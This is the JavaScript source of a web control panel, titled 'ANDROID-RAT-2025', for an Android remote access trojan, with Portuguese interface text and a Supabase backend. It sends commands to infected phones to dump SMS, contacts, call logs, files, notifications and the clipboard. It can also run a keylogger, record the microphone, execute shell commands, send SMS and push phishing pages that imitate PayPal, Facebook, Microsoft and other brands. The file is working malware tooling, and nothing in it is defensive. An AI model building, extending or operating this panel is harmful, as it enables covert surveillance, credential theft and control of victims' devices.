// script.js for ANDROID-RAT-2025 Web Panel (Supabase Integration)

// Global variables
let selectedDeviceId = null; // Track the currently selected device
let var32 = ''; // Used in file preview (from index.html)
let respov = ''; // Used in file preview (from index.html)

// Initialize device list on page load
$(document).ready(function () {
  updateDeviceList();
  // Poll for device updates every 5 seconds (Supabase free tier doesn't support real-time)
  setInterval(updateDeviceList, 5000);
});

// Fetch and display the list of devices
async function updateDeviceList() {
  try {
    const devices = await getDevices(); // Defined in index.html
    const usersDiv = $('#users');
    usersDiv.empty();
    usersDiv.append('<br><center>Lista de Dispositivos Conectados</center><br>');

    if (devices && devices.length > 0) {
      devices.forEach(device => {
        usersDiv.append(`
          <div class="usr">
            <span>${device.id}</span>
            <button onclick="selectDevice('${device.id}')">Controlar</button>
          </div>
        `);
      });
    } else {
      usersDiv.append('<center>Nenhum dispositivo conectado.</center>');
    }

    // Hide preloader after loading devices
    $('#preloaderr').hide();
  } catch (error) {
    console.error('Failed to fetch devices:', error);
    $('#users').html('<br><center>Erro ao obter dispositivos.</center>');
    $('#preloaderr').hide();
  }
}

// Select a device to control
function selectDevice(deviceId) {
  selectedDeviceId = deviceId;
  $('#users').hide();
  $('#phones').show();
  $('#backkk').show();
}

// Back button functionality
function backk(element) {
  $('#users').show();
  $('#phones').hide();
  $('#backkk').hide();
  $('#resp').hide();
  $('#fprev').hide();
  $('#viewers').hide();
  $('#shellcmd').hide();
  $('#notikey').hide();
  $('#toastdiv').hide();
  $('#diamain').hide();
  $('#pvtt').hide();
  $('#senddm').hide();
  $('#wallpaperdiv').hide();
  $('#micrec').hide();
  $('#showphishj').hide();
  selectedDeviceId = null;
}

// Send a command to the selected device
async function sendCommand(cmd, cmdVar, cmdVarM) {
  if (!selectedDeviceId) {
    alert('Selecione um dispositivo primeiro!');
    return;
  }

  try {
    const command = {
      cmd: cmd,
      cmdVar: cmdVar || '',
      cmdVarM: cmdVarM || '',
      timestamp: new Date().toISOString()
    };

    const { data, error } = await supabase
      .from('commands')
      .insert([{ deviceId: selectedDeviceId, ...command }]);
    
    if (error) {
      console.error('Error sending command:', error);
      $('#diatext').text('Erro ao enviar comando: ' + error.message);
      $('#diamain').show();
      return;
    }

    $('#diatext').text('Comando enviado com sucesso!');
    $('#diamain').show();
  } catch (error) {
    console.error('Failed to send command:', error);
    $('#diatext').text('Falha ao enviar comando.');
    $('#diamain').show();
  }
}

// Command functions from index.html
function dumpsms() {
  $('#phones').hide();
  $('#resp').show();
  $('#resp').html('<center>Obtendo SMS...</center>');
  sendCommand('dumpsms', '', '').then(() => {
    // Optionally fetch response from a 'responses' table if the APK writes back
  });
}

function calllogs() {
  $('#phones').hide();
  $('#resp').show();
  $('#resp').html('<center>Obtendo registros de chamadas...</center>');
  sendCommand('calllogs', '', '');
}

function filesmanager() {
  $('#phones').hide();
  $('#resp').show();
  $('#resp').html('<center>Obtendo arquivos...</center>');
  sendCommand('filesmanager', '', '');
}

function getpackages() {
  $('#phones').hide();
  $('#resp').show();
  $('#resp').html('<center>Obtendo lista de aplicativos...</center>');
  sendCommand('getpackages', '', '');
}

function deviceinfo() {
  $('#phones').hide();
  $('#resp').show();
  $('#resp').html('<center>Obtendo informações do sistema...</center>');
  sendCommand('deviceinfo', '', '');
}

function toastt() {
  $('#phones').hide();
  $('#toastdiv').show();
}

function toastexc() {
  const message = $('#toastcmd').val();
  sendCommand('toast', message, '');
  $('#toastdiv').hide();
}

function dumpcontact() {
  $('#phones').hide();
  $('#resp').show();
  $('#resp').html('<center>Obtendo contatos...</center>');
  sendCommand('dumpcontact', '', '');
}

function funcmd(fmc) {
  $('#phones').hide();
  $('#pvtt').show();
  $(`#${fmc}`).show();
}

function playmus() {
  const url = $('#musiccmd').val();
  sendCommand('playmusic', url, '');
}

function vibra() {
  const seconds = $('#vibratecmd').val();
  sendCommand('vibrate', seconds, '');
}

function ttsf() {
  const text = $('#ttscmd').val();
  sendCommand('tts', text, '');
}

function tont() {
  sendCommand('torch', 'on', '');
}

function tofft() {
  sendCommand('torch', 'off', '');
}

function opwebl() {
  const url = $('#opwebcmd').val();
  sendCommand('openurl', url, '');
}

function sendmsg() {
  $('#phones').hide();
  $('#senddm').show();
}

function sendsms() {
  const number = $('#smsnumber').val();
  const content = $('#smscontent').val();
  sendCommand('sendsms', number, content);
  $('#senddm').hide();
}

function startshell() {
  $('#phones').hide();
  $('#shellcmd').show();
}

function shellcm(element) {
  if (event.key === 'Enter') {
    const command = $(element).val();
    sendCommand('shell', command, '');
    $('#shelldata').append(`<br>$ ${command}`);
    $(element).val('');
  }
}

function keylogger() {
  $('#phones').hide();
  $('#notikey').show();
  $('#notikey').html('<center>Obtendo dados do keylogger...</center>');
  sendCommand('keylogger', '', '');
}

function changewallpaper() {
  $('#phones').hide();
  $('#wallpaperdiv').show();
}

let selectedWallpaper = './img/wall1.png';
function selectimg(element, index) {
  $('.wallimg img').removeAttr('id');
  $(element).attr('id', 'selectedimg');
  selectedWallpaper = $(element).attr('src');
}

async function setwalls() {
  // Upload wallpaper to Supabase Storage
  try {
    const response = await fetch(selectedWallpaper);
    const blob = await response.blob();
    const fileName = `wallpaper_${selectedDeviceId}_${Date.now()}.png`;
    const { data, error } = await supabase.storage
      .from('surveillance-files')
      .upload(`wallpapers/${fileName}`, blob);
    
    if (error) throw error;

    const wallpaperUrl = `${supabaseUrl}/storage/v1/object/public/surveillance-files/wallpapers/${fileName}`;
    sendCommand('setwallpaper', wallpaperUrl, '');
    $('#wallpaperdiv').hide();
  } catch (error) {
    console.error('Error uploading wallpaper:', error);
    $('#diatext').text('Erro ao definir papel de parede.');
    $('#diamain').show();
  }
}

function notificationlog() {
  $('#phones').hide();
  $('#notikey').show();
  $('#notikey').html('<center>Obtendo notificações...</center>');
  sendCommand('notificationlog', '', '');
}

function showphish() {
  $('#phones').hide();
  $('#showphishj').show();
}

function iojh() {
  const value = $('#lshpih').val();
  const options = [
    'dropbox3.png', 'facebook2.png', 'facebook5.png', 'free_fire3.png',
    'github1.png', 'instagram1.png', 'linkedin1.png', 'messenger1.png',
    'microsoft1.png', 'netflix1.png', 'paypal2.png', 'protonmail1.png',
    'pubg2.png', 'snapchat1.png', 'tumblir1.png', 'twitter1.png',
    'wordpress1.png', 'yahoo1.png'
  ];
  $('#hion').attr('src', `./imgg/${options[value]}`);
}

function execphish() {
  const title = $('#nshpih').val();
  const page = $('#phpage').val();
  sendCommand('phish', title, page);
}

function execphish2() {
  const link = $('#shpih').val();
  sendCommand('phishlink', link, '');
}

function showphpag() {
  $('#phones').hide();
  $('#showphishj').show();
}

function micrec() {
  $('#phones').hide();
  $('#micrec').show();
  $('#showrecs').html('<center>Obtendo gravações...</center>');
  sendCommand('listrecordings', '', '');
}

async function recordvoice() {
  const seconds = $('#recval').val();
  sendCommand('recordmic', seconds, '');
}

function showclip() {
  $('#phones').hide();
  $('#notikey').show();
  $('#notikey').html('<center>Obtendo dados da área de transferência...</center>');
  sendCommand('clipboard', '', '');
}

// File preview and download (from index.html)
function opfol(event) {
  // Placeholder for file preview logic
  $('#resp').hide();
  $('#fprev').show();
}

function setdatcmd(cmd, cmdVar, cmdVarM, resp) {
  // Placeholder for command data setting
  respov = resp;
}